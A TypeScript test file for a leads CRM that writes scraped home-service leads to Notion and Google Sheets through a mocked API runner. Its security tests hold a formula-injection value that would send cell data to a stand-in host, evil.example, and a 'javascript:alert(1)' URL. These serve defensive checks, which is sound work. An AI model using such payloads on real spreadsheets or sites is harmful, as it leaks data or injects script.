import { test } from 'node:test';
import assert from 'node:assert/strict';

process.env.XAI_API_KEY = 'test'; process.env.COMPOSIO_API_KEY = 'test'; process.env.SESSION_SECRET = 'test'; process.env.COMPUTER_PROVIDER = 'local';
process.env.DB_PATH = (await import('node:path')).join((await import('node:os')).tmpdir(), `leads-crm-test-${process.pid}.db`);

const { db, now } = await import('../src/db.js');
const crm = await import('../src/leads-crm.js');

// A fake Notion database + Sheet behind the Composio runner.
type Call = { slug: string; args: any };
const calls: Call[] = [];
const rows = new Map<string, { id: string; props: Record<string, any> }>();
let sheetFails = false;
const valueOf = (props: any[], name: string) => props.find((p) => p.name === name)?.value;
crm.setRunnerForTests(async (_u, slug, args) => {
  calls.push({ slug, args });
  if (slug === 'NOTION_CREATE_DATABASE') return { id: 'aaaaaaaabbbbccccddddeeeeeeeeeeee', url: 'https://www.notion.so/aaaaaaaabbbbccccddddeeeeeeeeeeee' };
  if (slug === 'NOTION_QUERY_DATABASE_WITH_FILTER') {
    const key = args.filter?.rich_text?.equals;
    if (key !== undefined) {
      const hit = [...rows.values()].find((r) => r.props.Key === key);
      return { response_data: { results: hit ? [{ id: hit.id, properties: { Score: { number: Number(hit.props.Score) } } }] : [] } };
    }
    return { results: [...rows.values()].map((r) => ({ properties: { Lead: { title: [{ plain_text: r.props.Lead }] }, Tier: { select: { name: r.props.Tier } }, Score: { number: Number(r.props.Score) }, Status: { select: { name: r.props.Status } } } })) };
  }
  if (slug === 'NOTION_INSERT_ROW_DATABASE') {
    const id = `row${rows.size + 1}`;
    rows.set(id, { id, props: Object.fromEntries(args.properties.map((p: any) => [p.name, p.value])) });
    return { id };
  }
  if (slug === 'NOTION_UPDATE_ROW_DATABASE') {
    const r = rows.get(args.row_id)!;
    for (const p of args.properties) r.props[p.name] = p.value;
    return { id: r.id };
  }
  if (slug === 'GOOGLESHEETS_SPREADSHEETS_VALUES_APPEND') { if (sheetFails) throw new Error('GOOGLESHEETS_SPREADSHEETS_VALUES_APPEND: timed out'); return {}; }
  throw new Error(`unexpected ${slug}`);
});

const user = 'u-leads';
db.prepare('INSERT INTO users(id,email,name,created_at) VALUES (?,?,?,?)').run(user, `${user}@example.com`, user, now());

const lead = (over: Record<string, unknown> = {}) => ({ name: 'M. M.', category: 'Outdoor', service: 'Patio cover', score: 82, area: 'Reno', source: 'Nextdoor', url: 'https://nextdoor.com/p/abc123?utm_source=x', ...over });

test('tiers come from the score', () => {
  assert.equal(crm.tierFor(70), 'Hot');
  assert.equal(crm.tierFor(69), 'Warm');
  assert.equal(crm.tierFor(40), 'Warm');
  assert.equal(crm.tierFor(39), 'Cold');
});

test('duplicate keys ignore tracking params, www/m and trailing slashes', () => {
  assert.equal(crm.leadKey({ url: 'https://www.facebook.com/groups/1/posts/2/?fbclid=zz', name: 'a' }), crm.leadKey({ url: 'https://m.facebook.com/groups/1/posts/2', name: 'b' }));
  assert.equal(crm.leadKey({ name: ' Pat  Smith ', area: 'Sparks' }), 'pat smith|sparks');
});

test('ids are read from Notion and Sheets links', () => {
  assert.equal(crm.notionId('https://www.notion.so/My-Page-0123456789abcdef0123456789abcdef'), '0123456789abcdef0123456789abcdef');
  assert.equal(crm.sheetId('https://docs.google.com/spreadsheets/d/1vDTZUlpx4W2ybl9LwM79g5qzwTdof7nAzs5Oa9I8-fo/edit'), '1vDTZUlpx4W2ybl9LwM79g5qzwTdof7nAzs5Oa9I8-fo');
  assert.equal(crm.notionId('not a link'), null);
});

test('saving before setup says how to set it up', async () => {
  await assert.rejects(crm.upsertLeads(user, [lead()]), /isn’t set up yet/);
});

test('setup creates the database under the page with every column, and remembers the sheet', async () => {
  const c = await crm.setupCrm(user, { parentPage: 'https://www.notion.so/Sierra-0123456789abcdef0123456789abcdef', sheet: 'https://docs.google.com/spreadsheets/d/1vDTZUlpx4W2ybl9LwM79g5qzwTdof7nAzs5Oa9I8-fo/edit', title: 'Sierra Home Pro Leads' });
  const made = calls.find((x) => x.slug === 'NOTION_CREATE_DATABASE')!;
  assert.equal(made.args.parent_id, '0123456789abcdef0123456789abcdef');
  assert.ok(made.args.properties.some((p: any) => p.name === 'Lead' && p.type === 'title'));
  assert.ok(made.args.properties.some((p: any) => p.name === 'Key'));
  assert.equal(c.notionDatabaseId, 'aaaaaaaabbbbccccddddeeeeeeeeeeee');
  assert.equal(c.sheetId, '1vDTZUlpx4W2ybl9LwM79g5qzwTdof7nAzs5Oa9I8-fo');
});

test('new leads go to Notion as New, with tier from score, and to the right Sheet tab', async () => {
  calls.length = 0;
  const r = await crm.upsertLeads(user, [lead(), lead({ name: 'Pat', category: 'Handyman', service: 'Drywall patch', score: 45, url: 'https://reno.craigslist.org/x/1.html' })]);
  assert.deepEqual([r.added, r.updated, r.unchanged, r.failed.length, r.mirrored], [2, 0, 0, 0, 2]);
  assert.deepEqual(r.hot, ['M. M.']);
  const ins = calls.filter((x) => x.slug === 'NOTION_INSERT_ROW_DATABASE');
  assert.equal(valueOf(ins[0].args.properties, 'Tier'), 'Hot');
  assert.equal(valueOf(ins[0].args.properties, 'Status'), 'New');
  assert.equal(valueOf(ins[1].args.properties, 'Tier'), 'Warm');
  const tabs = calls.filter((x) => x.slug === 'GOOGLESHEETS_SPREADSHEETS_VALUES_APPEND').map((x) => x.args.range);
  assert.deepEqual(tabs.sort(), ["'Handyman'!A1", "'Outdoor Jobs'!A1"]);
  const outdoorRow = calls.find((x) => x.args.range === "'Outdoor Jobs'!A1")!.args.values[0];
  assert.equal(outdoorRow.length, 16, 'matches the 16 tab columns');
  assert.equal(outdoorRow[5], 'Hot');
});

test('a re-scrape of the same post updates the score but never the Status, and is not mirrored again', async () => {
  const id = [...rows.values()].find((r) => r.props.Lead === 'M. M.')!.id;
  rows.get(id)!.props.Status = 'Quoted'; // someone worked the lead in Notion
  calls.length = 0;
  const r = await crm.upsertLeads(user, [lead({ score: 60, url: 'https://www.nextdoor.com/p/abc123/' })]);
  assert.deepEqual([r.added, r.updated, r.mirrored], [0, 1, 0]);
  const up = calls.find((x) => x.slug === 'NOTION_UPDATE_ROW_DATABASE')!;
  assert.equal(valueOf(up.args.properties, 'Status'), undefined, 'Status not sent');
  assert.equal(rows.get(id)!.props.Status, 'Quoted');
  assert.equal(rows.get(id)!.props.Tier, 'Warm');
});

test('same score again is left alone; duplicates in one batch count once', async () => {
  calls.length = 0;
  const r = await crm.upsertLeads(user, [lead({ score: 60 }), lead({ score: 60 })]);
  assert.deepEqual([r.added, r.updated, r.unchanged], [0, 0, 2]);
  assert.ok(!calls.some((x) => x.slug.startsWith('NOTION_UPDATE') || x.slug.startsWith('NOTION_INSERT')));
});

test('bad leads are reported, not saved; a Sheet timeout does not undo Notion', async () => {
  sheetFails = true;
  const r = await crm.upsertLeads(user, [
    { name: '', category: 'Outdoor', service: 'x', score: 50 },
    { name: 'A', category: 'Plumbing', service: 'x', score: 50 },
    { name: 'B', category: 'Handyman', service: 'x', score: 150 },
    { name: 'C', category: 'Handyman', service: 'x', score: 50, url: 'javascript:alert(1)' },
    lead({ name: 'Dee', url: 'https://reddit.com/r/reno/comments/9' }),
  ]);
  sheetFails = false;
  assert.equal(r.failed.length, 4);
  assert.equal(r.added, 1);
  assert.equal(r.mirrored, 0);
  assert.match(r.mirrorError ?? '', /timed out/);
});

test('listing asks Notion for best score first, filtered by tier', async () => {
  calls.length = 0;
  const leads = await crm.listLeads(user, { tier: 'Hot', limit: 5 });
  const q = calls.find((x) => x.slug === 'NOTION_QUERY_DATABASE_WITH_FILTER')!;
  assert.deepEqual(q.args.sorts, [{ property: 'Score', direction: 'descending' }]);
  assert.deepEqual(q.args.filter, { property: 'Tier', select: { equals: 'Hot' } });
  assert.equal(q.args.page_size, 5);
  assert.ok(leads.length > 0 && typeof leads[0].name === 'string');
});

test('the Sheet gets plain text: a cell starting with "=" can never run as a formula', async () => {
  calls.length = 0;
  await crm.upsertLeads(user, [lead({ name: '=IMPORTXML("https://evil.example/x?"&A1,"//a")', url: 'https://reno.craigslist.org/x/formula.html', category: 'Handyman' })]);
  const app = calls.find((x) => x.slug === 'GOOGLESHEETS_SPREADSHEETS_VALUES_APPEND')!;
  assert.equal(app.args.valueInputOption, 'RAW');
});

test('more than 25 leads: the extra ones are reported back, not silently dropped', async () => {
  const many = Array.from({ length: 27 }, (_, i) => lead({ name: `Bulk ${i}`, url: `https://reno.craigslist.org/x/bulk${i}.html`, score: 20 }));
  const r = await crm.upsertLeads(user, many);
  assert.equal(r.added + r.updated + r.unchanged, 25);
  assert.deepEqual(r.failed.map((f) => f.name), ['Bulk 25', 'Bulk 26']);
  assert.match(r.failed[0].error, /25-per-call limit/);
});

test('a posted date is kept as written, not moved to the next day by UTC', async () => {
  calls.length = 0;
  await crm.upsertLeads(user, [lead({ name: 'Evening post', url: 'https://reno.craigslist.org/x/evening.html', posted: '2026-11-25T20:30:00-0800' })]);
  const ins = calls.find((x) => x.slug === 'NOTION_INSERT_ROW_DATABASE')!;
  assert.equal(valueOf(ins.args.properties, 'Posted'), '2026-11-25');
});
